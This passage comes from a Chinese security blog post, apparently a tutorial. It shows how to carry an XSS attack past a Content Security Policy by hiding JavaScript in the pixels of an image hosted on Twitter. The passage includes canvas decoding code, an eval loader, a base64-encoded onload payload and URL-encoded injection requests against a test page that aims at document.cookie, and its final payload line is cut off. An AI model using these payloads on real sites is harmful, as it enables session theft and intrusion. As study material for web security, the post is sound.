dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Vestibulum tincidunt diam vel diam semper posuere. Nulla facilisi. Curabitur a facilisis lorem, eu porta leo. Sed pharetra eros et malesuada mattis. Donec tincidunt elementum mauris quis commodo. Donec nec vulputate nulla. Nunc luctus orci lacinia nunc sodales, vitae cursus quam tempor. Cras ullamcorper ullamcorper urna vitae pulvinar. Curabitur ac pretium felis. Vivamus vel scelerisque nisi. Pellentesque lacinia consequat nibh, vitae rhoncus tellus faucibus eget. Ut pulvinar est non tellus tristique sodales. Aenean eget velit non turpis tristique pretium id eu dolor. Nulla sed eros quis urna facilisis scelerisque. Nam orci neque, finibus eget odio et, elementum finibus erat.*&#x2F;&quot;;</span><br><span class="line">    img.src &#x3D; encode(stringenc), b.innerHTML &#x3D; &quot;&quot;, b.appendChild(img)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>运行代码：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%9B%BE%E7%89%87.png"></p>
<p>然后上传到推特</p>
<p>然后在用来测试的webapp中执行eval操作。</p>
<p>获得远程推特图像，可以发送下列请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xss.php?lang&#x3D;https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id&#x3D;%22jsimg%22%3E%3Ca+href&#x3D;%22</span><br></pre></td></tr></table></figure>

<p>注入JavaScript行，将图像转换为外部JavaScript库并绕过CSP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">t &#x3D; document.getElementById(&quot;jsimg&quot;);</span><br><span class="line">var s &#x3D; String.fromCharCode, c &#x3D; document.createElement(&quot;canvas&quot;);</span><br><span class="line">var cs &#x3D; c.style,</span><br><span class="line">    cx &#x3D; c.getContext(&quot;2d&quot;),</span><br><span class="line">    w &#x3D; t.offsetWidth,</span><br><span class="line">    h &#x3D; t.offsetHeight;</span><br><span class="line">c.width &#x3D; w;</span><br><span class="line">c.height &#x3D; h;</span><br><span class="line">cs.width &#x3D; w + &quot;px&quot;;</span><br><span class="line">cs.height &#x3D; h + &quot;px&quot;;</span><br><span class="line">cx.drawImage(t, 0, 0);</span><br><span class="line">var x &#x3D; cx.getImageData(0, 0, w, h).data;</span><br><span class="line">var a &#x3D; &quot;&quot;,</span><br><span class="line">    l &#x3D; x.length,</span><br><span class="line">    p &#x3D; -1;</span><br><span class="line">for (var i &#x3D; 0; i &lt; l; i +&#x3D; 4) &#123;</span><br><span class="line">    if (x[i + 0]) a +&#x3D; s(x[i + 0]);</span><br><span class="line">    if (x[i + 1]) a +&#x3D; s(x[i + 1]);</span><br><span class="line">    if (x[i + 2]) a +&#x3D; s(x[i + 2]);</span><br><span class="line">&#125;</span><br><span class="line">eval(a)</span><br></pre></td></tr></table></figure>

<p>将其base64编码后，放到onload属性中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onload&#x3D;&#39;javascript:eval(atob(&quot;dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp&quot;))&#39;</span><br></pre></td></tr></table></figure>

<p>接着，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xss.php?lang&#x3D;https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id&#x3D;%22jsimg%22+onload&#x3D;%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href&#x3D;%22</span><br></pre></td></tr></table></figure>



<p>但是，由于浏览器阻止了诸如getImageData跨域加载图像之类的方法，因此需要对crossorigin属性进行注入，注入到img标记中，注入值为“anonymous”的Crossorigin属性，接下来就可以成功执行函数<code>alert(document ent.cookie)</code></p>
<p>完整的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xss.php?lang&#x3D;https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3D</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/04/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF/" rel="prev" title="第四届海啸杯">
                  <i class="fa fa-chevron-left"></i> 第四届海啸杯
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/05/12/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
                  SQL注入 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">左</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  

</body>
</html>
